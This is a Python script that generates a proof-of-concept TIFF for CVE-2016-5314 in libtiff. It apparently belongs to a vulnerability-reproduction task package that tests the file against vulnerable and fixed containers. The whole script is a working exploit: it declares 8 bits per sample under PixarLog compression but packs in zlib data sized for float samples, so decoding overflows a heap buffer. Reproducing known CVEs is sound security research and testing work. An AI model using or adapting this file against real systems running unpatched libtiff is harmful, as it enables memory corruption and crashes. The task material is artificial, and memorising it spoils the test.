import struct
import zlib
import os


def build_poc():
    # Little-endian TIFF header: 'II' 0x2A and IFD offset = 8
    header = b"II*\x00\x08\x00\x00\x00"

    # Image geometry and strip layout
    width = 100
    height = 100
    rows_per_strip = 100
    spp = 3
    bps = 8
    num_strips = (height + rows_per_strip - 1) // rows_per_strip

    # Each strip will contain float data (4 bytes per sample) when decompressed
    # Keep BitsPerSample at 8 so the decoder allocates a smaller buffer (vulnerable case).
    packed_size_per_strip = width * rows_per_strip * spp * 4
    zlib_payload = zlib.compress(b'A' * packed_size_per_strip, level=9)

    # Build IFD entries. Use offsets (0) for arrays we will fill after computing layout.
    entries = [
        (254, 4, 1, 0),              # NewSubfileType
        (256, 3, 1, width),          # ImageWidth
        (257, 3, 1, height),         # ImageLength
        (258, 3, 1, bps),            # BitsPerSample (one value for all samples)
        (259, 3, 1, 32909),          # Compression: PIXARLOG
        (262, 3, 1, 2),              # PhotometricInterpretation: RGB
        (273, 4, num_strips, 0),     # StripOffsets (fill later)
        (277, 3, 1, spp),            # SamplesPerPixel
        (278, 4, 1, rows_per_strip), # RowsPerStrip
        (279, 4, num_strips, 0),     # StripByteCounts (fill later)
        (317, 3, 1, 2)               # Predictor: 2 (horizontal)
    ]

    # Sort entries by tag (common TIFF convention)
    entries.sort(key=lambda e: e[0])

    # Build IFD with placeholder values
    n = len(entries)
    ifd_entries = b""
    for tag, dtype, count, val in entries:
        ifd_entries += struct.pack("<HHII", tag, dtype, count, val)
    ifd = struct.pack("<H", n) + ifd_entries + struct.pack("<I", 0)

    # Compute layout offsets
    header_len = len(header)           # 8
    ifd_len = len(ifd)

    # Helper to replace the 4-byte value field for a tag in the IFD
    def set_ifd_value(ifd_bytes, tag_to_set, new_val):
        entries_bytes = ifd_bytes[2:2 + n * 12]
        for i in range(n):
            off = i * 12
            tag = struct.unpack_from("<H", entries_bytes, off)[0]
            if tag == tag_to_set:
                val_pos = 2 + off + 8
                return ifd_bytes[:val_pos] + struct.pack("<I", new_val) + ifd_bytes[val_pos + 4:]
        raise ValueError(f"tag {tag_to_set} not found in IFD")

    # For a single strip TIFF, TIFF convention stores the strip offset and bytecount
    # directly in the tag value (no separate arrays). For multiple strips we store
    # arrays after the IFD and point tags to those offsets.
    if num_strips == 1:
        payload_offset = header_len + ifd_len
        ifd = set_ifd_value(ifd, 273, payload_offset)            # StripOffset = payload start
        ifd = set_ifd_value(ifd, 279, len(zlib_payload))        # StripByteCount = compressed size
        payload_data = zlib_payload
        return header + ifd + payload_data
    else:
        strip_offsets_offset = header_len + ifd_len
        strip_offsets_size = num_strips * 4
        strip_bytecounts_offset = strip_offsets_offset + strip_offsets_size
        strip_bytecounts_size = num_strips * 4
        payload_offset = strip_bytecounts_offset + strip_bytecounts_size

        # Patch the offsets into the IFD
        ifd = set_ifd_value(ifd, 273, strip_offsets_offset)
        ifd = set_ifd_value(ifd, 279, strip_bytecounts_offset)

        # Build strip arrays and payload
        strip_offsets_data = b"".join(struct.pack("<I", payload_offset + i * len(zlib_payload)) for i in range(num_strips))
        strip_bytecounts_data = b"".join(struct.pack("<I", len(zlib_payload)) for _ in range(num_strips))
        payload_data = zlib_payload * num_strips

        return header + ifd + strip_offsets_data + strip_bytecounts_data + payload_data


output_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "tasks", "CVE-2016-5314_libtiff", "seeds", "poc.tiff"))

with open(output_path, "wb") as f:
    f.write(build_poc())

print("PoC regenerated for CVE-2016-5314 (100x100, RowsPerStrip=100) - test with vuln/fixed containers")
